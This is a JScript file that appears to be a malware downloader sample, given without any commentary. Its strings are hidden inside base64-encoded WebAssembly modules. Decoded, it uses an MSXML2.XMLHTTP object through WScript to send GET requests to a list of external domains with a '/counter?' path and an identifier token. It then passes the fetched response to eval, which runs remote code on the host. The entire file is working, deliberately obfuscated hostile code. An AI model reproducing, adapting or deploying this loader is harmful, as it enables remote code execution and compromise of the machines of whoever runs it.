const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __ifWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAF/AAKfgICAAAIDZW52CGltcEZ1bmMxAAADZW52CGltcEZ1bmMyAAADgoCAgAABAQSEgICAAAFwAAAFg4CAgAABAAEHkYCAgAACBm1lbW9yeQIABGRhdGEAAgqSgICAAAGMgICAAAAgAARAEAAFEAELCw==';
const __ifWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__ifWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__ifWasmBuffer, 'base64'));
    }
})());
const __callWasmBuffer = 'AGFzbQEAAAABhICAgAABYAAAAo+AgIAAAQNlbnYHaW1wRnVuYwAAA4KAgIAAAQAEhICAgAABcAAABYOAgIAAAQABB5GAgIAAAgZtZW1vcnkCAARkYXRhAAEKioCAgAABhICAgAAAEAAL';
const __callWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__callWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__callWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEG/4CAgAAXfwBBAQt/AEESC38AQRgLfwBBHAt/AEEeC38AQSQLfwBBKAt/AEEsC38AQTALfwBBNAt/AEE4C38AQToLfwBBwAALfwBB3AALfwBB8gALfwBBiAELfwBBmgELfwBBqAELfwBBogILfwBBqAILfwBBrgILfwBBugILfwBBwAILB8+BgIAAGAZtZW1vcnkCAAVkYXRhMAMABWRhdGExAwEFZGF0YTIDAgVkYXRhMwMDBWRhdGE0AwQFZGF0YTUDBQVkYXRhNgMGBWRhdGE3AwcFZGF0YTgDCAVkYXRhOQMJBmRhdGExMAMKBmRhdGExMQMLBmRhdGExMgMMBmRhdGExMwMNBmRhdGExNAMOBmRhdGExNQMPBmRhdGExNgMQBmRhdGExNwMRBmRhdGExOAMSBmRhdGExOQMTBmRhdGEyMAMUBmRhdGEyMQMVBmRhdGEyMgMWC5+DgIAAFwBBAQsPTVNYTUwyLlhNTEhUVFAAAEESCwQlMkYAAEEYCwJ0AABBHAsBAABBHgsEJTNBAABBJAsCcAAAQSgLAmgAAEEsCwJTAABBMAsCYQAAQTQLAlQAAEE4CwEAAEE6CwVHRVRBAABBwAALGmdyYXBoaWNkZXNpZ25kZW52ZXJjby5jb20AAEHcAAsUYXNpc21hcnJhdHhpbmV0LmNvbQAAQfIACxRhdXN0aW5zaG9ydHRlcm0uY29tAABBiAELEW9pZW9zdGVya2FtcC5jb20AAEGaAQsNZGV2LmFsYXcubmV0AABBqAELeTAwMDAwMDFOU2J2em16bVdNRFBVM0ZKZWlxMThqQjRkcTRBZWcxRUpMZmI0aUJXc2U2ZHY1czdpTXJQNkdMblpBQV9yeEZONmZmQUphRVRYd2JnRlRkTVR5MF9CQjdDSUpHUEZySVJxNm9YODV3N3lrQ3oxZnhJMAAAQaICCwQlMkYAAEGoAgsFaHR0cAAAQa4CCwslMkZjb3VudGVyAABBugILBCUzRgAAQcACCwVldmFsAA=='].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
var zm1 = lS(0, 0);
var pol = WScript.CreateObject(zm1);
var jamie = new Array(lS(0, 1), lS(0, 2), lS(0, 3), lS(0, 4), lS(0, 5), lS(0, 6), lS(0, 7), lS(0, 8), lS(0, 9), lS(0, 10));
jamie[1 + 1] = lS(0, 11);
jamie[2] = jamie[2].substr(0, 3);
var x = [
    lS(0, 12),
    lS(0, 13),
    lS(0, 14),
    lS(0, 15),
    lS(0, 16)
];
var m = lS(0, 17);
var gyt = 0;
var kus = lS(0, 18);
while (true) {
    if (gyt >= x.length) {
        break;
    }
    try {
        var ghyt = false;
        var tjkh = x[gyt + 0];
        (() => {
            const __callInstance2 = new WebAssembly.Instance(__callWasmModule, {
                env: {
                    impFunc: () => {
                        pol.open(jamie[1 + 1], lS(0, 19) + jamie[3] + kus + kus + tjkh + lS(0, 20) + lS(0, 21) + m, ghyt);
                    }
                }
            });
            const __exports = __callInstance2.exports;
            return __exports.data();
        })();
        (() => {
            const __callInstance1 = new WebAssembly.Instance(__callWasmModule, {
                env: {
                    impFunc: () => {
                        pol.send();
                    }
                }
            });
            const __exports = __callInstance1.exports;
            return __exports.data();
        })();
        var r = pol.responseText;
        var rima = 500;
        var got = 50 + 450 + rima;
        if (r.length - got > 0 && r.indexOf(m) > got + 1 - 1002) {
            var ght = r.split(m);
            var jimmk = ght.join(jamie[7]);
            (() => {
                const __ifInstance0 = new WebAssembly.Instance(__ifWasmModule, {
                    env: {
                        impFunc1: () => {
                            {
                                (() => {
                                    const __callInstance0 = new WebAssembly.Instance(__callWasmModule, {
                                        env: {
                                            impFunc: () => {
                                                ataaa(jimmk + jamie[9]);
                                            }
                                        }
                                    });
                                    const __exports = __callInstance0.exports;
                                    return __exports.data();
                                })();
                            }
                        },
                        impFunc2: () => {
                        }
                    }
                });
                const __exports = __ifInstance0.exports;
                return __exports.data(1 == 1 ? 1 : 0);
            })();
            break;
        }
        ;
    } catch (e) {
    }
    ;
    gyt++;
}
;
function ataaa(ziyter) {
    window[lS(0, 22, true)](ziyter);
}